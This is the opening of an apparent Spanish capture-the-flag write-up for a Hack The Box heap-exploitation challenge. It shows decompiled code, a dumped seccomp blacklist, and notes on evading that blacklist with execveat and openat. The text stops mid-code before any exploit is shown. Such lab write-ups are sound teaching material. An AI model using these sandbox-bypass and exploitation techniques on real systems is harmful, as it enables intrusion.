<!doctype html><html lang="es"><head><title>Dream Diary: Chapter 3 | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Binario de 64 bits. Explotación del _heap_. _Null byte poisoning_. _Overlapping chunks_. Tcache _poisoning_. ROP _chain_. Reglas `seccomp`"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Binario de 64 bits. Explotación del _heap_. _Null byte poisoning_. _Overlapping chunks_. Tcache _poisoning_. ROP _chain_. Reglas `seccomp`"><meta itemprop="keywords" content><meta itemprop="name" content="Dream Diary: Chapter 3"><meta property="article:published_time" content><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Binario de 64 bits. Explotación del _heap_. _Null byte poisoning_. _Overlapping chunks_. Tcache _poisoning_. ROP _chain_. Reglas `seccomp`"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Dream Diary: Chapter 3"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/ctf/htb-challenges/pwn/dream-diary-chapter-3/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Binario de 64 bits. Explotación del _heap_. _Null byte poisoning_. _Overlapping chunks_. Tcache _poisoning_. ROP _chain_. Reglas `seccomp`"><meta name="twitter:description" content="Binario de 64 bits. Explotación del _heap_. _Null byte poisoning_. _Overlapping chunks_. Tcache _poisoning_. ROP _chain_. Reglas `seccomp`"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Dream Diary: Chapter 3"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/ctf/htb-challenges/pwn/dream-diary-chapter-3/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/ctf/htb-challenges/pwn/dream-diary-chapter-3/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/ctf/htb-challenges/pwn/dream-diary-chapter-3/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/ctf/htb-challenges/pwn/dream-diary-chapter-3/&amp;text=Dream%20Diary:%20Chapter%203" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/ctf/htb-challenges/pwn/dream-diary-chapter-3/&amp;title=Dream%20Diary:%20Chapter%203" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Dream Diary: Chapter 3</h1><p class="mb4 f6 dib tracked">25 minutos de lectura</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#reglas-seccomp">Reglas <code>seccomp</code></a></li><li><a href="#opciones-del-programa">Opciones del programa</a></li><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#función-de-edición">Función de edición</a></li><li><a href="#función-de-liberación">Función de liberación</a></li><li><a href="#función-de-información">Función de información</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#fugando-direcciones-de-memoria">Fugando direcciones de memoria</a></li><li><a href="#_null-byte-poisoning_"><em>Null byte poisoning</em></a></li><li><a href="#rop-_chain_">ROP <em>chain</em></a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>Se nos proporciona un binario de 64 bits llamado <code>diary3</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-green">PIE enabled</span>
RUNPATH:  <span class="code-dark-red">b'./'
</code></pre></div><p>Además, también tenemos la librería y el cargador de Glibc remotos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./ld-2.29.so</span> <span class="mtku">libc.so.6</span>
GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.9) stable release version 2.31.  
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 9.4.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.
</code></pre></div><p>El binario ya está parcheado para usar estos archivos, por lo que no se necesitan acciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ldd</span> <span class="mtku">diary3</span>
        linux-vdso.so.1 (0x00007ffce37e2000)
        libc.so.6 =&gt; ./libc.so.6 (0x00007fc0db710000)
        ./ld-2.29.so =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fc0db904000)  
</code></pre></div><p>Además, hay una nota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">note.txt</span>
apparently, my friend told me that having /bin/sh in libc isn't safe... so I patched it up :p  
</code></pre></div><p>Entonces, la técnica típica de <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> no funciona esta vez&mldr;</p><h2 id="ingeniería-inversa">Ingeniería inversa</h2><p>Vamos a cargar el binario en Ghidra para analizar el código en C descompilado. Esto es <code>main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
<span class="mtk1">  undefined4 option;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> i;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>

<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
<span class="mtk1">  </span><span class="mtk8">signal</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, exit_troll);</span>
<span class="mtk1">  </span><span class="mtk8">alarm</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">78</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Welcome to Dream Diary: Chapter 3!  The return of</span><span class="mtk4"> a Dream Diary with modern protections!"</span><span class="mtk1">);</span>
<span class="mtk1">  </span><span class="mtk8">setvbuf</span><span class="mtk1">(stdout, </span><span class="mtk6">NULL</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">100</span><span class="mtk1">; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"1. write about dream </span><span class="mtk6">\n</span><span class="mtk4">2. edit dream</span><span class="mtk6">\n</span><span class="mtk4">3. delete dream</span><span class="mtk6">\n</span><span class="mtk4">4. recount dream</span><span class="mtk6">\n</span><span class="mtk4">5. exit diary</span><span class="mtk6">\n</span><span class="mtk4"> "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">53</span><span class="mtk1">, stderr);</span>  
<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"&gt; "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, stderr);</span>
<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">option);</span>

<span class="mtk1">    </span><span class="mtk5">switch</span><span class="mtk1"> (option) {</span>
<span class="mtk1">    </span><span class="mtk5">default</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"invalid choice</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">f</span><span class="mtk1">, stderr);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">      </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">write_dreams</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">edit_dream</span><span class="mtk1">();</span>
<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">delete_dream</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
<span class="mtk1">      </span><span class="mtk8">delete_dream</span><span class="mtk1">(</span><span class="mtk6">2</span><span class="mtk1">);</span>
<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">:</span>
<span class="mtk1">      i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">100000</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
<span class="mtk1">  }</span>

<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">}</span>
</code></pre></div><p>Está llamando a <code>setup</code> al principio:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">setup</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar1;</span>
<span class="mtk1">  </span>
<span class="mtk1">  iVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">prctl</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">26</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar1 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"Could not start seccomp"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>  
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>

<span class="mtk1">  iVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">prctl</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">16</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">DAT_001040a0);</span>

<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar1 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
<span class="mtk1">    </span><span class="mtk8">perror</span><span class="mtk1">(</span><span class="mtk4">"Could not start seccomp"</span><span class="mtk1">);</span>
<span class="mtk3">                    /* WARNING: Subroutine does no</span><span class="mtk3">t return */</span>
<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
<span class="mtk1">  }</span>
<span class="mtk1">}</span>
</code></pre></div><h3 id="reglas-seccomp">Reglas <code>seccomp</code></h3><p>Está configurando reglas <code>seccomp</code>, por lo que podemos emplear <a href="https://github.com/david942j/seccomp-tools"><code>seccomp-tools</code></a> para extraer los filtros:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">seccomp-tools</span> dump <span class="mtku">./diary3</span>
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == <span class="rb-cream">ARCH_X86_64</span>) goto 0003  
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000039  if (A != <span class="rb-green">fork</span>) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x0000003b  if (A != <span class="rb-green">execve</span>) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x0000003a  if (A != <span class="rb-green">vfork</span>) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x00000002  if (A != <span class="rb-green">open</span>) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x00000055  if (A != <span class="rb-green">creat</span>) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW
</code></pre></div><p>Como se puede ver, no podemos usar <code>sys_execve</code>, que es una instruccióm <code>syscall</code> utilizado por funciones como <code>system</code> para ejecutar comandos. Además, no podemos usar <code>sys_open</code> para abrir un archivo desde el servidor. Sin embargo, hay que tener en cuenta que este es un enfoque de lista negra (<em>blacklist</em>), por lo que hay muchas instrucciones <code>syscall</code> que aún podemos usar. Mirando en <a href="https://x64.syscall.sh/">x64.syscall.sh</a>, vemos algunas instrucciones <code>syscall</code> como <code>sys_execveat</code> or <code>openat</code>, que son similares a las anteriores. Por tanto, las reglas <code>seccomp</code> no supondran un grave problema.</p><p>Hay otras formas de saltarse las reglas <code>seccomp</code>, pero no funcionan en este reto (más información <a href="https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html">aquí</a>).</p><h3 id="opciones-del-programa">Opciones del programa</h3><p>El reto está relacionado con el <em>heap</em> y nos dan estas opciones:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./diary3</span>
Welcome to Dream Diary: Chapter 3!  The return of a Dream Diary with modern protections!  
1. write about dream
2. edit dream
3. delete dream
4. recount dream
5. exit diary
&gt;
</code></pre></div><h3 id="función-de-asignación">Función de asignación</h3><p>Esta es <code>write_dreams</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">write_dreams</span><span class="mtk1">() {</span>
<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p_dream;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index_copy;</span>
<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> index;</span>
<span class="mtk1">  ulong size;</span>

<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
<span class="mtk1">  index_copy </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>

<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">18</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> index_copy) {</span>
<span class="mtk1">LAB_001014a3:</span>
<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">18</span><span class="mtk1">) {</span>
<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"no more pages for dreams :(</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">1c</span><span class="mtk1">, stderr);</span>
<span class="mtk1">      } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"size: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">6</span><span class="mtk1">, stderr);</span>
